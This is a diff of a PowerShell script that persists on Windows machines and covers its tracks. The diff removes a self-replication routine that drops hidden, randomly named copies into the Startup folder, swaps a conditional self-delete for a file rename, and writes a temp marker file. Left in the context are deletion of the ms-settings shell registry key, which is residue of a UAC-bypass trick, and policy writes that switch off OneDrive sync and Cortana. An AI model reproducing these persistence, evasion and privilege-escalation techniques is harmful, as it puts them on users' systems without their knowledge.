@@ -7,14 +7,6 @@ $f = if ($s) { $s } else { $e }
 $tttttttttttttttttttt = [System.Environment]::GetFolderPath("startup")
 $tttttttttttttttttttt = "$tttttttttttttttttttt\"
 
-function Invoke-SelfReplication {
-    $replicated = [System.IO.Path]::Combine($tttttttttttttttttttt, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f))
-    if (-not (Test-Path ($tttttttttttttttttttt + [System.IO.Path]::GetFileName($f)))) {
-        Set-Content -Path $replicated -Value (Get-Content -Path $f -Raw)
-        (Get-Item $replicated).Attributes = 'Hidden'
-    }
-}
-
 function Invoke-SelfDestruction {
  
     Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force
@@ -35,15 +27,15 @@ function Invoke-SelfDestruction {
         }
     }
 
-    if (-not (Test-Path ($tttttttttttttttttttt + [System.IO.Path]::GetFileName($f)))) {
-        if ($s) {
-            Remove-Item -Path $f -Force
-        } else {
-            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$f' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
-        }
-    } else {
-        Rename-Item $f -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f)) -Force
-    }
+
+
+
+
+        Rename-Item -Path $f -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f)) -Force
+
+
+        New-Item -Path "$env:temp\avax.txt" -ItemType File -Force
+    
 }
 
 function Set-RegistryProperties {
@@ -152,7 +144,5 @@ Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataColl
 Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -properties @{"DisableFileSyncNGSC" = 1}
 
 Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -properties @{"AllowCortana" = 0}
-
-Invoke-SelfReplication
 
 Invoke-SelfDestruction
